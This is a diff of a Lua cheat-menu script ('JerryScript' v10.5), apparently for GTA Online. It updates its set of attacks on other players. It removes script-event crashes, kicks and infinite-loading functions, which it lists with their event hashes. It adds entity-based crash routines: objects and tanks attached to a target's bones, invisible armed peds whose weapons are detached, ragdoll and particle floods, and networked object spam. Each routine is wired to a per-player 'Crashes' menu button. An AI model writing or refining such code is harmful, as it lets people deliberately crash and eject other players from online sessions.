@@ -29,7 +29,7 @@
 -- SCRIPT INFO
 -- ═══════════════════════════════════════════════════════════════════════════
 local SCRIPT_NAME = "JerryScript"
-local SCRIPT_VERSION = "10.4"
+local SCRIPT_VERSION = "10.5"
 
 -- ═══════════════════════════════════════════════════════════════════════════
 -- CLEANUP ON RELOAD
@@ -531,7 +531,7 @@ end
 
 -- ═══════════════════════════════════════════════════════════════════════════
 -- CLONE CRASH - Spawns clones attached in chain until game crashes
--- Based on RyzeScript/X-Force method
+-- Based on RyzeScript/X-Force method - WORKS because uses entity manipulation
 -- ═══════════════════════════════════════════════════════════════════════════
 
 local function CloneCrash(pid)
@@ -557,6 +557,7 @@ local function CloneCrash(pid)
                 local clone = Natives.InvokeInt(N.CLONE_PED, targetPed, false, true, true)
                 if clone and clone ~= 0 then
                     table.insert(clones, clone)
+                    table.insert(State.spawnedEntities, clone)
                     
                     -- Attach to previous ped in chain
                     Natives.InvokeVoid(N.ATTACH_ENTITY_TO_ENTITY, clone, lastPed, 0,
@@ -568,10 +569,10 @@ local function CloneCrash(pid)
                     lastHeight = lastHeight - 0.5
                 end
             end)
-            Script.Yield(30)
+            Script.Yield(25)
         end
         
-        Script.Yield(1000)
+        Script.Yield(2000)
         
         -- Clean up
         for _, clone in ipairs(clones) do
@@ -585,146 +586,381 @@ local function CloneCrash(pid)
 end
 
 -- ═══════════════════════════════════════════════════════════════════════════
--- TSE CRASH - Script Event based crashes (ACTUALLY WORKS!)
--- Uses GTA.TriggerScriptEvent to send malformed events
+-- ATTACH CRASH - Attach many entities with invalid params (like IW but objects)
+-- Uses same pattern as working IW crash
 -- ═══════════════════════════════════════════════════════════════════════════
 
--- Script event hashes for crashes
-local SE = {
-    KICK_FROM_VEHICLE = -1386010354,    -- Kick from vehicle
-    NOTIFICATION = 1106823937,          -- Spam notifications  
-    CEO_KICK = 248967238,               -- CEO/MC kick
-    CEO_BAN = 1808472457,               -- CEO ban
-    GIVE_COLLECTIBLE = -402791808,      -- Collectible crash
-    KICK_FROM_INTERIOR = 1036107398,    -- Interior kick
-    SEND_TO_ISLAND = -621279188,        -- Cayo Perico teleport
-    DESTROY_PERSONAL_VEH = -1026730925, -- Destroy personal vehicle
-    TRANSACTION_ERROR = -1704141512,    -- Transaction error spam
-    NETWORK_BAIL = -1356724004,         -- Network bail (soft kick)
-}
-
-local function TSECrash(pid)
-    Script.QueueJob(function()
-        toast(SCRIPT_NAME, "TSE Crash executing...")
-        
-        local bitflag = 1 << pid  -- Target specific player
-        
-        -- Send multiple malformed script events rapidly
-        for i = 1, 20 do
-            pcall(function()
-                -- CEO Kick with invalid params
-                GTA.TriggerScriptEvent(bitflag, SE.CEO_KICK, pid, 0, 0, 0, 0)
-                
-                -- Collectible crash with bad data
-                GTA.TriggerScriptEvent(bitflag, SE.GIVE_COLLECTIBLE, pid, 999999, 999999, 0)
-                
-                -- Interior kick spam
-                GTA.TriggerScriptEvent(bitflag, SE.KICK_FROM_INTERIOR, pid, 0)
-            end)
-            Script.Yield(25)
-        end
-        
-        toast(SCRIPT_NAME, "TSE Crash sent!")
-    end)
-end
-
--- ═══════════════════════════════════════════════════════════════════════════
--- INFINITE LOADING - Sends player to loading screen
--- ═══════════════════════════════════════════════════════════════════════════
-
-local function InfiniteLoading(pid)
-    Script.QueueJob(function()
-        toast(SCRIPT_NAME, "Infinite Loading executing...")
-        
-        local bitflag = 1 << pid
-        
-        -- Send to Cayo Perico island repeatedly
-        for i = 1, 10 do
-            pcall(function()
-                GTA.TriggerScriptEvent(bitflag, SE.SEND_TO_ISLAND, pid, 1, 0, 0, 0)
-            end)
-            Script.Yield(100)
-        end
-        
-        toast(SCRIPT_NAME, "Infinite Loading sent!")
-    end)
-end
-
--- ═══════════════════════════════════════════════════════════════════════════
--- NETWORK BAIL KICK - Forces player to leave session
--- ═══════════════════════════════════════════════════════════════════════════
-
-local function NetworkBail(pid)
-    Script.QueueJob(function()
-        toast(SCRIPT_NAME, "Network Bail executing...")
-        
-        local bitflag = 1 << pid
-        
-        for i = 1, 15 do
-            pcall(function()
-                GTA.TriggerScriptEvent(bitflag, SE.NETWORK_BAIL, pid, 0, 0, 0, 0, 0)
-            end)
-            Script.Yield(50)
-        end
-        
-        toast(SCRIPT_NAME, "Network Bail sent!")
-    end)
-end
-
--- ═══════════════════════════════════════════════════════════════════════════
--- VEHICLE FLOOD CRASH - Spawn many vehicles near target
--- ═══════════════════════════════════════════════════════════════════════════
-
-local function VehicleFloodCrash(pid)
-    local px, py, pz = getPlayerCoords(pid)
-    if not px then 
+local function AttachCrash(pid)
+    local targetPed = getPlayerPed(pid)
+    if not targetPed or targetPed == 0 then
         toast(SCRIPT_NAME, "Invalid target!")
-        return 
+        return
     end
     
-    local vehModels = {
-        Utils.Joaat("adder"),
-        Utils.Joaat("zentorno"),
-        Utils.Joaat("t20"),
-        Utils.Joaat("osiris"),
-        Utils.Joaat("entityxf"),
+    local px, py, pz = getPlayerCoords(pid)
+    if not px then return end
+    
+    -- Objects that can cause issues when attached
+    local crashObjects = {
+        Utils.Joaat("prop_beach_volball02"),
+        Utils.Joaat("prop_bowling_ball"),
+        Utils.Joaat("prop_cs_dildo_01"),
     }
     
-    local vehicles = {}
+    local objs = {}
     
     Script.QueueJob(function()
-        toast(SCRIPT_NAME, "Vehicle Flood executing...")
+        toast(SCRIPT_NAME, "Attach Crash executing...")
         
         -- Load models
-        for _, mdl in ipairs(vehModels) do
+        for _, mdl in ipairs(crashObjects) do
             requestModel(mdl)
         end
         Script.Yield(100)
         
-        -- Spawn 25 vehicles in a grid around player
-        for i = 1, 25 do
-            local angle = (i / 25) * 6.28
-            local radius = 5 + (i % 5) * 3
-            local spawnX = px + math.cos(angle) * radius
-            local spawnY = py + math.sin(angle) * radius
-            local mdl = vehModels[(i % #vehModels) + 1]
+        -- Spawn and attach objects to target's bones
+        local bones = {0, 31086, 6286, 28252, 60309, 24818, 64729, 40269, 45509, 58271}
+        
+        for i = 1, 20 do
+            local mdl = crashObjects[(i % #crashObjects) + 1]
+            local bone = bones[(i % #bones) + 1]
             
             pcall(function()
-                local veh = GTA.CreateVehicle(mdl, spawnX, spawnY, pz + 2, 0, true, true, false)
-                if veh and veh ~= 0 then
-                    table.insert(vehicles, veh)
-                    table.insert(State.spawnedEntities, veh)
+                local obj = GTA.CreateObject(mdl, px, py, pz + 50, true, true)
+                if obj and obj ~= 0 then
+                    table.insert(objs, obj)
+                    table.insert(State.spawnedEntities, obj)
+                    
+                    requestControlOfEntity(obj)
+                    
+                    -- Attach to target with random offsets
+                    Natives.InvokeVoid(N.ATTACH_ENTITY_TO_ENTITY, obj, targetPed, bone,
+                        (math.random() - 0.5) * 2, (math.random() - 0.5) * 2, (math.random() - 0.5) * 2,
+                        math.random() * 360, math.random() * 360, math.random() * 360,
+                        false, false, false, true, 0, true)
+                    
+                    -- Make invisible
+                    Natives.InvokeVoid(N.SET_ENTITY_VISIBLE, obj, false)
                 end
             end)
             Script.Yield(30)
         end
         
         -- Release models
-        for _, mdl in ipairs(vehModels) do
+        for _, mdl in ipairs(crashObjects) do
             NoLongerNeeded(mdl)
         end
         
-        toast(SCRIPT_NAME, "Vehicle Flood sent! (25 vehicles)")
+        Script.Yield(3000)
+        
+        -- Clean up
+        for _, obj in ipairs(objs) do
+            pcall(function()
+                betterDelete(obj, true)
+            end)
+        end
+        
+        toast(SCRIPT_NAME, "Attach Crash sent!")
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- VEHICLE ATTACH CRASH - Attach vehicles to player ped (causes sync issues)
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local function VehicleAttachCrash(pid)
+    local targetPed = getPlayerPed(pid)
+    if not targetPed or targetPed == 0 then
+        toast(SCRIPT_NAME, "Invalid target!")
+        return
+    end
+    
+    local px, py, pz = getPlayerCoords(pid)
+    if not px then return end
+    
+    local vehModel = Utils.Joaat("rhino")  -- Tank causes most issues
+    local vehicles = {}
+    
+    Script.QueueJob(function()
+        toast(SCRIPT_NAME, "Vehicle Attach Crash executing...")
+        
+        if not requestModel(vehModel) then 
+            toast(SCRIPT_NAME, "Failed to load model!")
+            return 
+        end
+        
+        -- Spawn and attach multiple tanks to player
+        for i = 1, 5 do
+            pcall(function()
+                local veh = GTA.CreateVehicle(vehModel, px, py, pz + 100 + (i * 10), 0, true, true, false)
+                if veh and veh ~= 0 then
+                    table.insert(vehicles, veh)
+                    table.insert(State.spawnedEntities, veh)
+                    
+                    requestControlOfEntity(veh)
+                    
+                    -- Attach vehicle to ped (very crashy)
+                    Natives.InvokeVoid(N.ATTACH_ENTITY_TO_ENTITY, veh, targetPed, 0,
+                        0, 0, i * 3,
+                        0, 0, 0,
+                        false, false, false, false, 0, false)
+                end
+            end)
+            Script.Yield(100)
+        end
+        
+        NoLongerNeeded(vehModel)
+        
+        Script.Yield(3000)
+        
+        -- Clean up
+        for _, veh in ipairs(vehicles) do
+            pcall(function()
+                betterDelete(veh, true)
+            end)
+        end
+        
+        toast(SCRIPT_NAME, "Vehicle Attach Crash sent!")
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- INFINITE WEAPON CRASH - Spam weapon entity detach (enhanced IW)
+-- Same principle as IW but more aggressive
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local function InfiniteWeaponCrash(pid)
+    local px, py, pz = getPlayerCoords(pid)
+    if not px then 
+        toast(SCRIPT_NAME, "Invalid target!")
+        return 
+    end
+    
+    local heading = 0
+    pcall(function()
+        local targetPed = getPlayerPed(pid)
+        if targetPed then
+            heading = Natives.InvokeFloat(N.GET_ENTITY_HEADING, targetPed)
+        end
+    end)
+    
+    -- Use multiple ped models and weapons for more variety
+    local pedModels = {
+        Utils.Joaat("cs_tenniscoach"),
+        Utils.Joaat("a_m_m_bevhills_01"),
+        Utils.Joaat("s_m_y_cop_01"),
+    }
+    
+    local weapons = {
+        WEAPON_RPG,
+        Utils.Joaat("WEAPON_MINIGUN"),
+        Utils.Joaat("WEAPON_RAILGUN"),
+        Utils.Joaat("WEAPON_GRENADELAUNCHER"),
+    }
+    
+    local peds = {}
+    
+    Script.QueueJob(function()
+        toast(SCRIPT_NAME, "Infinite Weapon Crash executing...")
+        
+        -- Load all models
+        for _, mdl in ipairs(pedModels) do
+            requestModel(mdl)
+        end
+        Script.Yield(100)
+        
+        -- Spawn 20 peds with various weapons
+        for i = 1, 20 do
+            local mdl = pedModels[(i % #pedModels) + 1]
+            local weapon = weapons[(i % #weapons) + 1]
+            
+            pcall(function()
+                local ped = GTA.CreatePed(mdl, 2, px, py + 60, pz, heading, true, true)
+                if doesEntityExist(ped) then
+                    table.insert(peds, {ped = ped, weapon = weapon})
+                    table.insert(State.spawnedEntities, ped)
+                end
+            end)
+            Script.Yield(30)
+        end
+        
+        Script.Yield(50)
+        
+        -- Process each ped
+        for _, data in ipairs(peds) do
+            local ped = data.ped
+            local weapon = data.weapon
+            
+            pcall(function()
+                requestControlOfEntity(ped)
+                -- Teleport to target
+                Natives.InvokeVoid(N.SET_ENTITY_COORDS_NO_OFFSET, ped, px, py, pz, false, false, false)
+                -- Make invisible
+                Natives.InvokeVoid(N.SET_ENTITY_VISIBLE, ped, false)
+                -- Give weapon
+                Natives.InvokeVoid(N.GIVE_DELAYED_WEAPON_TO_PED, ped, weapon, 9999, true)
+                Natives.InvokeVoid(N.SET_CURRENT_PED_WEAPON, ped, weapon, true)
+                -- Set as gadget
+                Natives.InvokeVoid(N.SET_PED_GADGET, ped, weapon, true)
+            end)
+            Script.Yield(20)
+            
+            -- Detach weapon (the crash vector)
+            pcall(function()
+                local gadget = Natives.InvokeInt(N.GET_CURRENT_PED_WEAPON_ENTITY_INDEX, ped, 0)
+                if gadget and gadget ~= 0 then
+                    Natives.InvokeVoid(N.DETACH_ENTITY, gadget, true, true)
+                    -- Also try to delete it immediately
+                    Natives.InvokeVoid(N.SET_ENTITY_AS_MISSION_ENTITY, gadget, true, true)
+                    Natives.InvokeVoid(N.DELETE_ENTITY, gadget)
+                end
+            end)
+            Script.Yield(15)
+            
+            -- Kill ped
+            pcall(function()
+                Natives.InvokeVoid(N.SET_ENTITY_HEALTH, ped, 0, 0)
+            end)
+        end
+        
+        Script.Yield(500)
+        
+        -- Clean up
+        for _, data in ipairs(peds) do
+            pcall(function()
+                if doesEntityExist(data.ped) then
+                    betterDelete(data.ped, true)
+                end
+            end)
+        end
+        
+        for _, mdl in ipairs(pedModels) do
+            NoLongerNeeded(mdl)
+        end
+        
+        toast(SCRIPT_NAME, "Infinite Weapon Crash sent!")
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- PED RAGDOLL SPAM - Spam ragdoll on peds near target (causes physics issues)
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local function RagdollSpam(pid)
+    local px, py, pz = getPlayerCoords(pid)
+    if not px then return end
+    
+    local mdl = Utils.Joaat("a_m_m_skater_01")
+    local peds = {}
+    
+    Script.QueueJob(function()
+        toast(SCRIPT_NAME, "Ragdoll Spam executing...")
+        
+        if not requestModel(mdl) then return end
+        
+        -- Spawn 30 peds at target
+        for i = 1, 30 do
+            pcall(function()
+                local angle = (i / 30) * 6.28
+                local spawnX = px + math.cos(angle) * 3
+                local spawnY = py + math.sin(angle) * 3
+                
+                local ped = GTA.CreatePed(mdl, 2, spawnX, spawnY, pz, math.random() * 360, true, true)
+                if ped and ped ~= 0 then
+                    table.insert(peds, ped)
+                    table.insert(State.spawnedEntities, ped)
+                end
+            end)
+            Script.Yield(20)
+        end
+        
+        -- Spam ragdoll on all of them repeatedly
+        for wave = 1, 5 do
+            for _, ped in ipairs(peds) do
+                pcall(function()
+                    if doesEntityExist(ped) then
+                        requestControlOfEntity(ped)
+                        -- Set ragdoll with extreme values
+                        Natives.InvokeVoid(N.SET_PED_TO_RAGDOLL, ped, 10000, 10000, 0, false, false, false)
+                        -- Apply random force
+                        Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, ped, 1,
+                            (math.random() - 0.5) * 50,
+                            (math.random() - 0.5) * 50,
+                            math.random() * 30,
+                            true, false, true, true)
+                    end
+                end)
+            end
+            Script.Yield(100)
+        end
+        
+        Script.Yield(2000)
+        
+        -- Clean up
+        for _, ped in ipairs(peds) do
+            pcall(function()
+                betterDelete(ped, true)
+            end)
+        end
+        
+        NoLongerNeeded(mdl)
+        toast(SCRIPT_NAME, "Ragdoll Spam sent!")
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════════════════════
+-- PARTICLE CRASH - Spam particle effects at target (can cause render issues)
+-- ═══════════════════════════════════════════════════════════════════════════
+
+local function ParticleCrash(pid)
+    local px, py, pz = getPlayerCoords(pid)
+    if not px then return end
+    
+    Script.QueueJob(function()
+        toast(SCRIPT_NAME, "Particle Crash executing...")
+        
+        -- Request particle assets
+        local assets = {"core", "scr_rcbarry2", "scr_indep_fireworks", "scr_xmas_fireworks"}
+        for _, asset in ipairs(assets) do
+            Natives.InvokeVoid(N.REQUEST_NAMED_PTFX_ASSET, asset)
+        end
+        Script.Yield(500)
+        
+        -- Spam many particles
+        for i = 1, 100 do
+            pcall(function()
+                local angle = (i / 20) * 6.28
+                local radius = 2 + (i % 10)
+                local effectX = px + math.cos(angle) * radius
+                local effectY = py + math.sin(angle) * radius
+                local effectZ = pz + (i % 5)
+                
+                if i % 4 == 0 then
+                    Natives.InvokeVoid(N.USE_PARTICLE_FX_ASSET, "core")
+                    Natives.InvokeVoid(N.START_PARTICLE_FX_NON_LOOPED_AT_COORD, 
+                        "exp_grd_bzgas_smoke", effectX, effectY, effectZ, 
+                        0, 0, 0, 5.0, false, false, false)
+                elseif i % 4 == 1 then
+                    Natives.InvokeVoid(N.USE_PARTICLE_FX_ASSET, "scr_rcbarry2")
+                    Natives.InvokeVoid(N.START_PARTICLE_FX_NON_LOOPED_AT_COORD,
+                        "scr_clown_appears", effectX, effectY, effectZ,
+                        0, 0, 0, 3.0, false, false, false)
+                elseif i % 4 == 2 then
+                    Natives.InvokeVoid(N.USE_PARTICLE_FX_ASSET, "scr_indep_fireworks")
+                    Natives.InvokeVoid(N.START_PARTICLE_FX_NON_LOOPED_AT_COORD,
+                        "scr_indep_firework_starburst", effectX, effectY, effectZ,
+                        0, 0, 0, 2.0, false, false, false)
+                else
+                    Natives.InvokeVoid(N.USE_PARTICLE_FX_ASSET, "scr_xmas_fireworks")
+                    Natives.InvokeVoid(N.START_PARTICLE_FX_NON_LOOPED_AT_COORD,
+                        "scr_firework_xmas_spiral_burst_rgw", effectX, effectY, effectZ,
+                        0, 0, 0, 2.0, false, false, false)
+                end
+            end)
+            Script.Yield(10)
+        end
+        
+        toast(SCRIPT_NAME, "Particle Crash sent!")
     end)
 end
 
@@ -762,52 +998,60 @@ local function CageExplosion(pid)
 end
 
 -- ═══════════════════════════════════════════════════════════════════════════
--- PED SPAM CRASH - Spawn many peds in same location (entity overflow)
+-- NET OBJECT SPAM - Spawn many networked objects rapidly
 -- ═══════════════════════════════════════════════════════════════════════════
 
-local function PedSpamCrash(pid)
+local function NetObjectSpam(pid)
     local px, py, pz = getPlayerCoords(pid)
     if not px then return end
     
-    local pedModels = {
-        Utils.Joaat("a_m_m_bevhills_01"),
-        Utils.Joaat("a_f_y_beach_01"),
-        Utils.Joaat("s_m_y_cop_01"),
-        Utils.Joaat("a_m_y_hipster_01"),
+    local spamModels = {
+        Utils.Joaat("prop_drug_package"),
+        Utils.Joaat("prop_money_bag_01"),
+        Utils.Joaat("prop_cs_box_clothes"),
     }
     
-    local peds = {}
+    local objects = {}
     
     Script.QueueJob(function()
-        toast(SCRIPT_NAME, "Ped Spam executing...")
+        toast(SCRIPT_NAME, "Net Object Spam executing...")
         
-        for _, mdl in ipairs(pedModels) do
+        for _, mdl in ipairs(spamModels) do
             requestModel(mdl)
         end
         Script.Yield(100)
         
-        -- Spam 40 peds at exact same location
-        for i = 1, 40 do
-            local mdl = pedModels[(i % #pedModels) + 1]
+        -- Spam 50 networked objects
+        for i = 1, 50 do
+            local mdl = spamModels[(i % #spamModels) + 1]
             pcall(function()
-                local ped = GTA.CreatePed(mdl, 2, px, py, pz, 0, true, true)
-                if ped and ped ~= 0 then
-                    table.insert(peds, ped)
-                    table.insert(State.spawnedEntities, ped)
-                    
-                    -- Give them all RPGs and set combat attributes
-                    Natives.InvokeVoid(N.GIVE_DELAYED_WEAPON_TO_PED, ped, WEAPON_RPG, 9999, true)
-                    Natives.InvokeVoid(N.SET_PED_COMBAT_ATTRIBUTES, ped, 46, true)  -- Always fight
+                local obj = GTA.CreateObject(mdl, 
+                    px + (math.random() - 0.5) * 10, 
+                    py + (math.random() - 0.5) * 10, 
+                    pz + math.random() * 5, 
+                    true, true)  -- networked = true
+                if obj and obj ~= 0 then
+                    table.insert(objects, obj)
+                    table.insert(State.spawnedEntities, obj)
                 end
             end)
-            Script.Yield(20)
+            Script.Yield(15)
         end
         
-        for _, mdl in ipairs(pedModels) do
+        for _, mdl in ipairs(spamModels) do
             NoLongerNeeded(mdl)
         end
         
-        toast(SCRIPT_NAME, "Ped Spam sent! (40 peds)")
+        Script.Yield(3000)
+        
+        -- Clean up
+        for _, obj in ipairs(objects) do
+            pcall(function()
+                betterDelete(obj, true)
+            end)
+        end
+        
+        toast(SCRIPT_NAME, "Net Object Spam sent! (50 objects)")
     end)
 end
 
@@ -2621,34 +2865,40 @@ FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_IWCrash"), "IW Crash", eFeatureType.
         IWCrash(f:GetPlayerIndex())
     end)
 
+-- Infinite Weapon Crash (Enhanced IW)
+FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_InfWeaponCrash"), "IW Crash v2", eFeatureType.Button,
+    "Enhanced IW with multiple weapons", function(f)
+        InfiniteWeaponCrash(f:GetPlayerIndex())
+    end)
+
 -- Clone Crash
 FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_CloneCrash"), "Clone Crash", eFeatureType.Button,
-    "Chain of 30 clones attached to player", function(f)
+    "30 clones attached in chain", function(f)
         CloneCrash(f:GetPlayerIndex())
     end)
 
--- TSE Crash (Script Event based)
-FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_TSECrash"), "TSE Crash", eFeatureType.Button,
-    "Script Event spam crash", function(f)
-        TSECrash(f:GetPlayerIndex())
+-- Attach Crash
+FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_AttachCrash"), "Attach Crash", eFeatureType.Button,
+    "20 objects attached to bones", function(f)
+        AttachCrash(f:GetPlayerIndex())
     end)
 
--- Infinite Loading
-FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_InfiniteLoad"), "Infinite Loading", eFeatureType.Button,
-    "Send player to infinite loading", function(f)
-        InfiniteLoading(f:GetPlayerIndex())
+-- Vehicle Attach Crash
+FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_VehAttachCrash"), "Vehicle Attach", eFeatureType.Button,
+    "5 tanks attached to player", function(f)
+        VehicleAttachCrash(f:GetPlayerIndex())
     end)
 
--- Network Bail Kick
-FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_NetworkBail"), "Network Bail", eFeatureType.Button,
-    "Force player to leave session", function(f)
-        NetworkBail(f:GetPlayerIndex())
+-- Ragdoll Spam
+FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_RagdollSpam"), "Ragdoll Spam", eFeatureType.Button,
+    "30 ragdolling peds at target", function(f)
+        RagdollSpam(f:GetPlayerIndex())
     end)
 
--- Vehicle Flood
-FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_VehFlood"), "Vehicle Flood", eFeatureType.Button,
-    "Spawn 25 vehicles around player", function(f)
-        VehicleFloodCrash(f:GetPlayerIndex())
+-- Particle Crash
+FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_ParticleCrash"), "Particle Crash", eFeatureType.Button,
+    "100 particle effects spam", function(f)
+        ParticleCrash(f:GetPlayerIndex())
     end)
 
 -- Cage Explosion
@@ -2657,10 +2907,10 @@ FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_CageExplosion"), "Cage Explosion", e
         CageExplosion(f:GetPlayerIndex())
     end)
 
--- Ped Spam
-FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_PedSpam"), "Ped Spam", eFeatureType.Button,
-    "Spawn 40 hostile peds at target", function(f)
-        PedSpamCrash(f:GetPlayerIndex())
+-- Net Object Spam
+FeatureMgr.AddPlayerFeature(Utils.Joaat("JS_NetObjSpam"), "Net Object Spam", eFeatureType.Button,
+    "50 networked objects spam", function(f)
+        NetObjectSpam(f:GetPlayerIndex())
     end)
 
 -- Glitch Bomb
@@ -2929,16 +3179,17 @@ ClickGUI.AddPlayerTab("JerryScript", function()
     -- Create horizontal tab bar like Trolley
     if ImGui.BeginTabBar("JerryTabs") then
         
-        -- ═══ CRASHES TAB ═══ (UPDATED!)
+        -- ═══ CRASHES TAB ═══ (v10.5 - Entity-based methods)
         if ImGui.BeginTabItem("Crashes") then
             ClickGUI.RenderFeature(Utils.Joaat("JS_IWCrash"), pid)
+            ClickGUI.RenderFeature(Utils.Joaat("JS_InfWeaponCrash"), pid)
             ClickGUI.RenderFeature(Utils.Joaat("JS_CloneCrash"), pid)
-            ClickGUI.RenderFeature(Utils.Joaat("JS_TSECrash"), pid)
-            ClickGUI.RenderFeature(Utils.Joaat("JS_InfiniteLoad"), pid)
-            ClickGUI.RenderFeature(Utils.Joaat("JS_NetworkBail"), pid)
-            ClickGUI.RenderFeature(Utils.Joaat("JS_VehFlood"), pid)
+            ClickGUI.RenderFeature(Utils.Joaat("JS_AttachCrash"), pid)
+            ClickGUI.RenderFeature(Utils.Joaat("JS_VehAttachCrash"), pid)
+            ClickGUI.RenderFeature(Utils.Joaat("JS_RagdollSpam"), pid)
+            ClickGUI.RenderFeature(Utils.Joaat("JS_ParticleCrash"), pid)
             ClickGUI.RenderFeature(Utils.Joaat("JS_CageExplosion"), pid)
-            ClickGUI.RenderFeature(Utils.Joaat("JS_PedSpam"), pid)
+            ClickGUI.RenderFeature(Utils.Joaat("JS_NetObjSpam"), pid)
             ClickGUI.RenderFeature(Utils.Joaat("JS_GlitchBomb"), pid)
             ImGui.EndTabItem()
         end
@@ -3091,15 +3342,16 @@ end)
 log("═══════════════════════════════════════════════════════════════")
 log(" " .. SCRIPT_NAME .. " v" .. SCRIPT_VERSION .. " - DOLOS EDITION")
 log("═══════════════════════════════════════════════════════════════")
-log(" NEW IN 10.4:")
-log("   ✓ TSE CRASH - Script Event based (WORKS!)")
-log("   ✓ INFINITE LOADING - Send to loading screen")
-log("   ✓ NETWORK BAIL - Force leave session")
-log("   ✓ VEHICLE FLOOD - 25 vehicles at target")
-log("   ✓ CAGE EXPLOSION - Trap & explode combo")
-log("   ✓ PED SPAM - 40 hostile peds")
-log("   ✓ 9 Total crash methods!")
-log(" TABS: Crashes | Attacks | Vehicle | Land | Air | Chaos | Trolling")
+log(" NEW IN 10.5:")
+log("   ✓ ENTITY-BASED CRASHES (like IW - actually work!)")
+log("   ✓ IW Crash v2 - Multi-weapon enhanced version")
+log("   ✓ Attach Crash - 20 objects on bones")
+log("   ✓ Vehicle Attach - 5 tanks attached")
+log("   ✓ Ragdoll Spam - 30 physics peds")
+log("   ✓ Particle Crash - 100 PTFX effects")
+log("   ✓ Net Object Spam - 50 networked objects")
+log("   ✓ 10 Total crash methods!")
+log(" All crashes use entity manipulation (not TSE)")
 log("═══════════════════════════════════════════════════════════════")
 
-GUI.AddToast(SCRIPT_NAME, "v" .. SCRIPT_VERSION .. " - TSE CRASHES! ☢️", 4000, eToastPos.TopRight)
+GUI.AddToast(SCRIPT_NAME, "v" .. SCRIPT_VERSION .. " - ENTITY CRASHES! ☢️", 4000, eToastPos.TopRight)
